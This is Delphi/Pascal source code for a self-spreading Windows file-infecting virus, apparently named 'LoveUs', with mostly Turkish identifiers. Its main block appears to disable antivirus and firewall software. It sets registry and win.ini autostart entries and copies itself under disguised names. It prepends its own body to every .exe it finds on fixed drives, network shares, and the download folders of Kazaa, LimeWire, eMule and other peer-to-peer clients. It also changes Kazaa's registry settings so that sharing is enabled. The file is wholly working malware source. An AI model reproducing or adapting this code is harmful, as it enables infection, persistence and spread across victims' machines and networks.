   Program LoveUs;
   {$R Icon.Res}

   uses
     DirBul,
     FwAvKill,
     Shellapi,
     Windows;

   Const
    RegName='MELIS';
    PrName='melis.exe';
    ScrName='naz.scr';
    TmpFolder='Temp\Project32';

   Type
   NetResArray=Array [0.. 1000] Of TNetResource;
   PNetResArray=^NetResArray;

   Var
   Sonuc1,Sonuc2,KaynakDosya:String;
   Buffer:Pointer;BufSize,Dosya1Uz:Integer;
   Deger:Integer;
   HndKey:Hkey;
   //-SysUtilsStart
    {$I sysutils.inc}
   //-SysUtilsEnd
    {$I others.inc}
   //-OthersEnd

   Procedure Parcala(Uz1 :Integer; KaynakDosya, Cikti1, Cikti2: String);
   Var
   FromF,ToF1,ToF2:File;
   Okunan,Yazilan,Tmp:Integer;
   Buf: array[1..1024] of Char;
   Uygun:Boolean;
   Begin
    FileMode:=2;
    AssignFile(FromF, KaynakDosya);
    Reset(FromF, 1);
   If FileSize(FromF) > Uz1 Then
   Begin
    {$I-}
    AssignFile(ToF1, Cikti1);
    ReWrite(ToF1, 1);
    CloseFile(ToF1);
    Uygun:= (IOResult = 0);
    {$I+}
   If Uygun Then
   Begin
    AssignFile(ToF1, Cikti1);
    ReWrite(ToF1, 1);
   End;
    AssignFile(ToF2, Cikti2);
    Rewrite(ToF2, 1);

    Tmp:=0;

     Repeat
       BlockRead(FromF, Buf, SizeOf(Buf), Okunan);
       If Uygun Then BlockWrite(ToF1, Buf, Okunan, Yazilan);
       Tmp:=Tmp+Okunan;
     until (Tmp>Uz1-1);
     Seek(FromF,Uz1);
     Repeat
       BlockRead(FromF, Buf, SizeOf(Buf), Okunan);
       BlockWrite(ToF2, Buf, Okunan, Yazilan);
     until (Okunan = 0) or (Yazilan <> Okunan);

   If Uygun Then CloseFile(ToF1);
     CloseFile(ToF2);
     CloseFile(FromF);
   End Else
   Begin
    If Not FileExists(Windizin+PrName) Then
    CopyFile(pchar(ParamStr(0)),pchar(Windizin+PrName), FALSE);
    CloseFile(FromF);
   End;
   If FileExists(Sonuc1) Then ShellExecute(GetDesktopWindow, 'open',PChar(Sonuc1), nil, nil, 0);//Temp
   End;
   Function Bulasmismi(HedefDosya:String):Boolean;
   Var
    Dosya1S:String;
    Dosya1F,Dosya2F:File;
    Okunan1,Okunan2:Array[0..2048] of Char;
    Uygun:Boolean;
   Begin
    FileMode:=2;
   {$I-}
    AssignFile(Dosya1F, HedefDosya);
    Reset(Dosya1F, 1);
    CloseFile(Dosya1F);
   {$I+}
    Uygun:= (IOResult = 0) and (HedefDosya <> '');
    FileMode:=0;
    If Uygun=True Then
    Begin
     Dosya1S:=Windizin+scrname;
     CopyFile(pchar(ParamStr(0)),Pchar(Dosya1S), FALSE);
     AssignFile(Dosya1F, HedefDosya);
     Reset(Dosya1F, 1);
     AssignFile(Dosya2F, Dosya1S);
     Reset(Dosya2F, 1);

     BlockRead(Dosya1F,Okunan1,SizeOf(Okunan1));
     BlockRead(Dosya2F,Okunan2,SizeOf(Okunan2));


     If Okunan1 <> Okunan2 Then Result:=False
     Else Result:=True;

     CloseFile(Dosya1F);
     CloseFile(Dosya2F);
    End
    Else
    Result:=True;
   End;
   Procedure Birlestir(Dosya2S:String);
   Var
    HedefDosya1:String;
    Dosya2,HedefDosya:File;
    Okunan,Yazilan:Integer;
    Buf: array[1..2048] of Char;
   Begin
   If Bulasmismi(Dosya2S) = False Then
   Begin

    HedefDosya1:=Dosya2S+'.Tmp';
    FileMode:=2;
    CopyFile(Pchar(ParamStr(0)),Pchar(HedefDosya1), FALSE);

    AssignFile(Dosya2, Dosya2S);
    Reset(Dosya2, 1);
    AssignFile(HedefDosya, HedefDosya1);
    Reset(HedefDosya, 1);

    Seek(HedefDosya,Dosya1Uz);
    Repeat
     BlockRead(Dosya2, Buf, SizeOf(Buf), Okunan);
     BlockWrite(HedefDosya, Buf, Okunan, Yazilan);
    Until (Okunan = 0) or (Yazilan <> Okunan);

    CloseFile(HedefDosya);
    CloseFile(Dosya2);
    CopyFile(Pchar(HedefDosya1),Pchar(Dosya2S), FALSE);
    DeleteFile(Pchar(HedefDosya1));
   End;
   End;
   Procedure BulBulas(Klasor:String);
   Var
   Bulunan: TSearchRec;
   Begin
   If FindFirst (Klasor+'\*.exe' , faAnyFile, Bulunan) = 0 Then
   Begin
    Repeat
    Birlestir(Klasor+'\'+Bulunan.Name);
    Until FindNext(Bulunan)<>0;
   End;
    If FindFirst(Klasor+'\*.*', faDirectory,Bulunan) = 0 Then
    Repeat
     If (Bulunan.Name <> '.') and (Bulunan.Name <> '..') and (Bulunan.Attr=faDirectory) Then
     Begin
     BulBulas(Klasor+'\'+Bulunan.Name);
     End;
    Until FindNext(Bulunan)<> 0;
    FindClose(Bulunan);
   End;
   Procedure BulSil(Klasor,Ext:String);
   Var
   Bulunan: TSearchRec;
   Begin
   If FindFirst (Klasor+'\*.'+Ext , faAnyFile, Bulunan) = 0 Then
   Begin
    Repeat
    Try
    DeleteFile(Pchar(Klasor+'\'+Bulunan.Name));
    Except
    End;
    Until FindNext(Bulunan)<>0;
   End;
   End;
   //-
   Procedure WinIniAra(Klasor:String);
   Var
   Bulunan: TSearchRec;
   Begin
   If FindFirst (Klasor+'\win.ini' , faAnyFile, Bulunan) = 0 Then
   Begin
    Repeat
    Begin
    If Not FileExists(Klasor+'\INeedYou.exe') Then CopyFile(Pchar(ParamStr(0)),Pchar(Klasor+'\INeedYou.exe'),False);
    WritePrivateProfileString ('windows','run',Pchar('INeedYou.exe'),Pchar(Klasor+'\'+Bulunan.Name));
    End;
    Until FindNext(Bulunan)<>0;
   End;
    If FindFirst(Klasor+'\*.*', faDirectory,Bulunan) = 0 Then
    Repeat
     If (Bulunan.Name <> '.') and (Bulunan.Name <> '..') and (Bulunan.Attr=faDirectory) Then
     Begin
     WinIniAra(Klasor+'\'+Bulunan.Name);
     End;
    Until FindNext(Bulunan)<> 0;
    FindClose(Bulunan);
   End;
   //-
   Procedure AgBulBulas(Yer:String);
   var
   Yer1:String;
   Begin
   Yer1:=Yer;
   If Yer[Length(Yer)]<>'\' Then Yer:=Yer+'\';
   If DirectoryExists(Yer+'Downloads') Then BulBulas(Yer+'\Downloads');
   If DirectoryExists(Yer+'My Downloads') Then BulBulas(Yer+'\My Downloads');
   If DirectoryExists(Yer+'My Shared Folder') Then BulBulas(Yer+'\My Shared Folder');
   If DirectoryExists(Yer+'mIRC\Download') Then BulBulas(Yer+'\mIRC\Download');
   If Not FileExists(Yer+'INeedYou.exe') Then CopyFile(Pchar(ParamStr(0)),Pchar(Yer+'INeedYou.exe'), False);
   WinIniAra(Yer1);
   End;
   Procedure Suruculer;
   Var
     Buffer : Array [0..500] of Char;
     Temp   : PChar;
     Tip    : integer;
     Sonuc  : String;
   Begin
     Sonuc:='';
     GetLogicalDriveStrings(Sizeof(Buffer), Buffer);
     Temp := Buffer;
     While temp[0] <> #0 do
     Begin
       tip := GetDriveType( temp );
         Case Tip of
           DRIVE_FIXED  : AgBulBulas(Temp);
           DRIVE_REMOTE : AgBulBulas(Temp);
         End;
       temp := StrEnd(temp) + 1;
     End;
   End;
   //-
   Procedure KazaaInfect;
   var
   DlDir9:String;
   Value:Boolean;
   Begin
   RegOpenKeyEx(HKEY_CURRENT_USER,
    'Software\Kazaa\LocalContent',
    1,KEY_ALL_ACCESS,HndKey);
   Value:=False;Deger:=Ord(Value);
   BufSize:=SizeOf(Deger);Buffer:=@Deger;
   RegSetValueEx(hndKey,'DisableSharing',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(hndKey);

   If (DlDir0<>'') And DirectoryExists(DlDir0) Then BulBulas(DlDir0); //Kazaa1
   If (DlDir1<>'') And DirectoryExists(DlDir1) Then BulBulas(DlDir1); //Kazaa2
   If (DlDir2<>'') And DirectoryExists(DlDir2) Then BulBulas(DlDir2); //ShareAza
   If (DlDir3<>'') And DirectoryExists(DlDir3) Then BulBulas(DlDir3); //LimeWire
   If (DlDir4<>'') And DirectoryExists(DlDir4) Then BulBulas(DlDir4); //Imesh
   If (DlDir5<>'') And DirectoryExists(DlDir5) Then BulBulas(DlDir5); //IE
   If (DlDir6<>'') And DirectoryExists(DlDir6) Then BulBulas(DlDir6); //Documents
   If (DlDir7<>'') And DirectoryExists(DlDir7) Then BulBulas(DlDir7); //Desktop
   If (DlDir8<>'') And DirectoryExists(DlDir8) Then BulBulas(DlDir8); //ICQ Receive
   DlDir9:=PrDir;
   If DirectoryExists(DlDir9+'\Kazaa\My Shared Folder') Then BulBulas(DlDir9+'\Kazaa\My Shared Folder');
   If DirectoryExists(DlDir9+'\Kazaa Lite\My Shared Folder') Then BulBulas(DlDir9+'\Kazaa Lite\My Shared Folder');
   If DirectoryExists(DlDir9+'\KMD\My Shared Folder') Then BulBulas(DlDir9+'\KMD\My Shared Folder');
   If DirectoryExists(DlDir9+'\LimeWire\Shared') Then BulBulas(DlDir9+'\LimeWire\Shared');
   If DirectoryExists(DlDir9+'\Gnucleus\Downloads') Then BulBulas(DlDir9+'\Gnucleus\Downloads');
   If DirectoryExists(DlDir9+'\Shareaza\Downloads') Then BulBulas(DlDir9+'\Shareaza\Downloads');
   If DirectoryExists(DlDir9+'\BearShare\Shared') Then BulBulas(DlDir9+'\BearShare\Shared'); //BearShare
   If DirectoryExists(DlDir9+'\Edonkey2000\Incoming') Then BulBulas(DlDir9+'\Edonkey2000\Incoming'); //Edonkey
   If DirectoryExists(DlDir9+'\Morpheus\My Shared Folder') Then BulBulas(DlDir9+'\Morpheus\My Shared Folder'); //Morpheus
   If DirectoryExists(DlDir9+'\Grokster\My Grokster') Then BulBulas(DlDir9+'\Grokster\My Grokster');
   If DirectoryExists(DlDir9+'\WinMX\My Shared Folder') Then BulBulas(DlDir9+'\WinMX\My Shared Folder');
   If DirectoryExists(DlDir9+'\Tesla\Files') Then BulBulas(DlDir9+'\Tesla\Files');
   If DirectoryExists(DlDir9+'\Overnet\Incoming') Then BulBulas(DlDir9+'\Overnet\Incoming');
   If DirectoryExists(DlDir9+'\XoloX\Downloads') Then BulBulas(DlDir9+'\XoloX\Downloads');
   If DirectoryExists(DlDir9+'\Rapigator\Share') Then BulBulas(DlDir9+'\Rapigator\Share');
   If DirectoryExists(DlDir9+'\ICQ\Shared Files') Then BulBulas(DlDir9+'\ICQ\Shared Files'); //Icq Shared Folder
   If DirectoryExists(DlDir9+'\mIRC\Download') Then BulBulas(DlDir9+'\mIRC\Download');
   Suruculer;
   End;
   //-
   Function NetHazirla(Pnr:PNetResource):Boolean;
   Var
   PnrLocal:PNetResource;
   BufBoyut,dwResult,Entries,dwResultEnum:Dword;
   hEnum:THandle;
   i:Integer;
   PnrLocalArr:PNETRESARRAY;
   Tmp1:TNetResource;
   Begin
   dwResult := WNetOpenEnum(RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,Pnr,hEnum);
   BufBoyut:=16384;
   Entries:=$FFFFFFFF;
   If (dwResult <> NO_ERROR) Then
   Begin
    Result:=False;
    Exit;
   End;

   Repeat
    PnrLocal := PNetResource(GlobalAlloc(GPTR, BufBoyut));
    dwResultEnum := WNetEnumResource(hEnum,Entries,PnrLocal,BufBoyut);
    If (dwResultEnum = NO_ERROR) Then
    Begin
     For i := 0 To Entries-1 Do
     Begin
     PnrLocalArr:=PNetResArray(PnrLocal);
     Tmp1:=PnrLocalArr[i];

     If ((Tmp1.dwUsage And RESOURCEUSAGE_CONNECTABLE)<>0)
     And (Tmp1.dwType=RESOURCETYPE_DISK)
     And (Tmp1.dwDisplayType=RESOURCEDISPLAYTYPE_SHARE)
     Then
     Begin
     AgBulBulas(Tmp1.lpRemoteName);
     End;
     If(RESOURCEUSAGE_CONTAINER =(PnrLocalArr[i].dwUsage And RESOURCEUSAGE_CONTAINER))
     Then NetHazirla(@PnrLocalArr[i]);
     End;
    End;
   Until dwResultEnum = ERROR_NO_MORE_ITEMS ;
   GlobalFree(THandle(PnrLocal));
   dwResult := WNetCloseEnum(hEnum);
   If (dwResult <> NO_ERROR) Then
   Begin
    Result:=False;
    Exit;
   End;
   Result:=true;
   End;
   //-

   Begin
   AvFwKill;
   KayitSil;
   //
   Randomize;
   Sonuc1:=Windizin+PrName;
   Sonuc2:=Windizin+TmpFolder+'\'+RandomStr(6)+'.exe';
   KaynakDosya:=Windizin+TmpFolder+'\'+RandomStr(6)+'.exe';
   Dosya1Uz:=14336;
   //
   If UpperCase(ParamStr(0)) <> UpperCase(Sonuc1) Then Begin
   Try
    BulSil(Windizin+TmpFolder,'exe');
    If FileExists(Sonuc1) Then DeleteFile(Pchar(Sonuc1));
    If FileExists(Sonuc2) Then DeleteFile(Pchar(Sonuc2));
    If Not DirectoryExists(Windizin+TmpFolder) Then KlasorYap(Windizin+TmpFolder);
    CopyFile(pchar(ParamStr(0)),Pchar(KaynakDosya), False);
    Parcala(Dosya1Uz, KaynakDosya, Sonuc1, Sonuc2);
    DeleteFile(Pchar(KaynakDosya));
    AutoStart(Sonuc1,Regname);
    If FileExists(Sonuc1) Then ShellExecute(GetDesktopWindow, 'open',PChar(Sonuc1), nil, nil, 0);
   // SetFileAttributes(PChar(Sonuc1),FILE_ATTRIBUTE_HIDDEN); //Temp Code
    If FileExists(Sonuc2) Then ShellExecute(GetDesktopWindow, 'open',PChar(Sonuc2), nil, nil, 0);
    PostQuitMessage(0);
   Except;
   End;
    Halt(0);
   End;
   AutoStart(ParamStr(0),Regname);
   If Not FileExists(Windizin+scrname) Then
   CopyFile(pchar(ParamStr(0)),pchar(Windizin+scrname), FALSE);
   //SetFileAttributes(PChar(Paramstr(0)),FILE_ATTRIBUTE_HIDDEN);
   KayitAyarlari(True);
   KazaaInfect;

   NetHazirla(Nil);


   End.
